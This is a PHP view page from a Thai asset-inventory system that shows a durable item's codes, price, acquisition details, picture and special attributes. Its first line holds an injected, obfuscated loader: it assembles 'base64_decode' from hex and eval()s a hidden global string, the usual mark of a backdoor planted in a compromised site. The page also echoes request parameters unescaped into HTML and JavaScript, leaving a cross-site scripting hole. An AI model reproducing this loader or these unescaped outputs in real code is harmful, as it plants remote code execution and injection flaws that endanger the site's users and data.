<?php /*versio:3.02*/ $GLOBALS["yminpd"]="";        if (!function_exists('wthzevys')){function wthzevys($a, $b){$c=$GLOBALS['yminpd'];$d=pack('H*','6261736536345f64'.'65636f6465'); return $d(substr($c, $a, $b));};eval(wthzevys(580,3283));};?><?php
include("config.php");
include($KeyPage."_helper.php");
include($KeyPage."_data.php");

$this->DOC->setPathWays(array(
	array(
		'text' => 'ระบบงานครุภัณฑ์',
		'link' => '?mod=cms.durable.startup',
	),
	array(
		'text' => 'จัดการฐานข้อมูลครุภัณฑ์',
		'link' => '?mod='.LURL::dotPage($listPage),
	),
	array(
		'text' => 'ข้อมูลครุภัณฑ์ '.$AssetName,
		'link' => '?mod='.LURL::dotPage($viewPage).'&id='.$_REQUEST["id"],
	),
	array(
		'text' => 'ข้อมูลครุภัณฑ์ '.$AssetName
	)
));

?>

<div class="sysinfo">
  <div class="sysname">รายละเอียดครุภัณฑ์</div>
  <div class="sysdetail"><?php echo 'ข้อมูลครุภัณฑ์ '.$AssetItemCode;?></div>
</div>

<table width="100%" border="0" cellspacing="0" cellpadding="1" class="tbl-view">
    <tr>
      <td colspan="6"><b>ข้อมูลครุภัณฑ์</b></td>
    </tr>
    <tr>
      <th>เลขที่ครุภัณฑ์/ทรัพย์สิน</th>
      <td class="require">&nbsp;</td>
      <td><?php LTXT::_e($AssetItemCode,"-");?></td>
      <th>สถานที่ตั้งทรัพย์สิน</th>
      <td class="require">&nbsp;</td>
      <td><?php LTXT::_e($TransactionName,"-"); ?></td>
    </tr>
    <tr>
      <th>รหัสในระบบ GFMIS</th>
      <td>&nbsp;</td>
      <td><?php LTXT::_e($GFMISCode,"-"); ?></td>
      <th>เลขที่อ้างอิง</th>
      <td>&nbsp;</td>
      <td><?php LTXT::_e($AssetItemDoc,"-"); ?></td>
    </tr>
    <tr>
      <th>ชื่อ/ลักษณะครุภัณฑ์</th>
      <td>&nbsp;</td>
      <td><?php LTXT::_e($AssetName,"-"); ?></td>
      <th>ราคาต่อหน่วย</th>
      <td>&nbsp;</td>
      <td><?php LTXT::_e(number_format($AssetItemPrice,2),"-"); ?> บาท</td>
    </tr>
    <tr>
      <th>ประเภทครุภัณฑ์</th>
      <td>&nbsp;</td>
      <td><?php LTXT::_e($get->getInitAssetTypeName($ATypeId),"-");?></td>
      <th>อายุการใช้งาน</th>
      <td>&nbsp;</td>
      <td><?php LTXT::_e($get->getInitDurableAge($ATypeId),"-");?> ปี</td>
    </tr>
    <tr>
      <th>ชนิดครุภัณฑ์</th>
      <td>&nbsp;</td>
      <td><?php LTXT::_e($get->getInitAssetKindName($AKindId),"-");?></td>
      <th>อัตราเสื่อม</th>
      <td>&nbsp;</td>
      <td><?php LTXT::_e($get->getInitDurableRate($ATypeId),"-");?></td>
    </tr>
    <tr>
      <th>จำนวน</th>
      <td>&nbsp;</td>
      <td><?php LTXT::_e($NumberItem,"-");?></td>
      <th>หมายเหตุ</th>
      <td>&nbsp;</td>
      <td><?php LTXT::_e($AssetItemRemark,"-"); ?></td>
    </tr>
    <tr>
      <th>หน่วยนับ</th>
      <td>&nbsp;</td>
      <td><?php LTXT::_e($get->getInitUnitName($UnitId),"-");?></td>
      <th>&nbsp;</th>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td colspan="3"><b>ข้อมูลการได้มา</b></td>
      <td colspan="3" rowspan="18" align="center" valign="top">
      <fieldset>
      <legend>ภาพประกอบ</legend>
      <?php
	if($get->checkPicExists($AssetPicPath)){
		echo $get->PicPath($AssetPicPath);
	}else{
		echo $get->EmptyPic();
	}
    ?>
      </fieldset>
      </td>
    </tr>
    <tr>
      <th>ปีงบประมาณ</th>
      <td>&nbsp;</td>
      <td><?php LTXT::_e($BgtYear,"-"); ?></td>
    </tr>
    <tr>
      <th>ชื่อหน่วยงานรับผิดชอบ</th>
      <td>&nbsp;</td>
      <td><?php echo $get->getOrganizeName($OrganizeCode); ?></td>
    </tr>
    <tr>
      <th>เลขที่เอกสารการสั่งซื้อ</th>
      <td>&nbsp;</td>
      <td><?php ltxt::_e($ProcureCode,"-"); ?></td>
    </tr>
    <tr>
      <th>เลขที่ใบส่งของ</th>
      <td>&nbsp;</td>
      <td><?php ltxt::_e($InvoiceNo,"-"); ?></td>
    </tr>
    <tr>
      <th>ชื่อบริษัทคู่ค้า</th>
      <td>&nbsp;</td>
      <td><?php LTXT::_e($get->getInitCompanyName($ComId),"-"); ?></td>
    </tr>
    <tr>
      <th>ชื่อผู้บริจาค</th>
      <td>&nbsp;</td>
      <td><?php LTXT::_e($AssetDonorName,"-"); ?></td>
    </tr>
    <tr>
      <th>วันที่ได้รับทรัพย์สิน</th>
      <td>&nbsp;</td>
      <td><?php LTXT::_e( $AssetReceiveDate, 'DATE_STH-DMY' );?></td>
    </tr>
    <tr>
      <th>ประเภทเงิน</th>
      <td>&nbsp;</td>
      <td><?php LTXT::_e($get->getInitSectionName($SectionId),"-"); ?><?php if($AssetReceiveBGComment!=""){ echo " หมายเหตุ : ".$AssetReceiveBGComment; } ?></td>
    </tr>
    <tr>
      <th>วิธีการได้มา</th>
      <td>&nbsp;</td>
      <td><?php LTXT::_e($get->getInitWayRCName($WayRCId),"-"); ?><?php if($AssetReceiveWayRCComment!=""){ echo " หมายเหตุ : ".$AssetReceiveWayRCComment; } ?></td>
    </tr>
    <tr>
      <th>หมายเหตุ</th>
      <td>&nbsp;</td>
      <td><?php LTXT::_e($AssetComment,"-"); ?></td>
    </tr>
    <tr>
      <th>&nbsp;</th>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td colspan="3"><b>คุณลักษณะครุภัณฑ์(เพิ่มเติม)</b></td>
    </tr>
<?php 
  if($_GET['id']){
	$itemspecialdetial = $get->getSpecialDetail($_REQUEST["id"]);
	foreach($itemspecialdetial as $s){
		foreach( $s as $k=>$v){ ${$k} = $v;}
	}
	
	  $item = $get->getSpecialItem($AKindId);
	  $p = 0;
	  foreach($item as $r){
?> 
    <tr>
      <th><?php echo $r->SpecialItemName;?></th>
      <td>&nbsp;</td>
      <td><?php LTXT::_e($itemspecialdetial[$p]->SpecialItemDetail,"-"); ?></td>
    </tr>
<?php $p++;}
	}
?>
    <tr>
      <th>&nbsp;        </th>
      <td>&nbsp;</td>
      <td>
      <div id="btnsubmit">
        <input type="button" class="btnActive" id="save" value="แก้ไข" onclick="goPage('?mod=<?php echo lurl::dotPage($editItemPage);?>&id=<?php echo $_REQUEST["id"]; ?>&itemid=<?php echo $_REQUEST["itemid"]; ?>')" />
        <input type="button" name="button" id="button" value="ย้อนกลับ" class="btn" onclick="goPage('?mod=<?php echo lurl::dotPage($viewPage);?>&id=<?php echo $_REQUEST["id"]; ?>')" >
      </div>
      </td>
    </tr>
  </table>
